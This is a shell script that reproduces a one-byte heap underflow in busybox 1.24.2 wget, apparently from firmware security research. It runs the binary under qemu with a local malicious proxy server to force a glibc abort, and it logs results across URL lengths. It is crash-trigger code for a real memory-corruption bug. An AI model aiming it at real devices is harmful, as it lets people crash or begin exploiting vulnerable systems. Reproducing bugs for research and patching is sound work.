#!/bin/sh
# Reproduce the 1-byte heap underflow of busybox 1.24.2 wget as a glibc abort.
#
# The underflow itself (docs/RE_WGET_FUZZ.md, finding 2) is masked on the device because the
# same store empties the host and the fetch dies at `bad address ''` before the corrupted
# chunk is freed. With http_proxy set, the proxy supplies the address, the fetch completes,
# and free() aborts on the corrupted chunk.
#
# Run it on the rig host (css), not on the Mac: it needs qemu-ppc, python3, and the 57.23
# rootfs-extracted busybox + its /lib under $ROOT.
#   ROOT=~/fsonos-s20 ./repro_underflow_proxy.sh
# Expected: rc 134 and `free(): invalid pointer` (or `invalid next size` for long URLs).
set -u
ROOT=${ROOT:-$HOME/fsonos-s20}
PORT=${PORT:-19003}
HERE=$(dirname "$0")

python3 "$HERE/chunk_srv.py" --port "$PORT" --file "$HERE/cases3/000-control-one-chunk.http" --serve 8 &
srv=$!
sleep 1

for n in 1 2 16 200 300 5000; do
    url="?$(python3 -c "print('a' * $n)")"
    out=$(cd "$ROOT" && http_proxy=http://127.0.0.1:$PORT timeout 8 \
        qemu-ppc -L . ./bin/busybox wget -qC /tmp/wget-underflow.log -T 3 -O /dev/null "$url" 2>&1)
    printf 'len=%-5s rc=%-3s %s\n' "$n" "$?" \
        "$(printf '%s' "$out" | grep -o 'glibc detected.*\|bad address.*\|uncaught target signal [0-9]*' | head -1)"
done

kill "$srv" 2>/dev/null
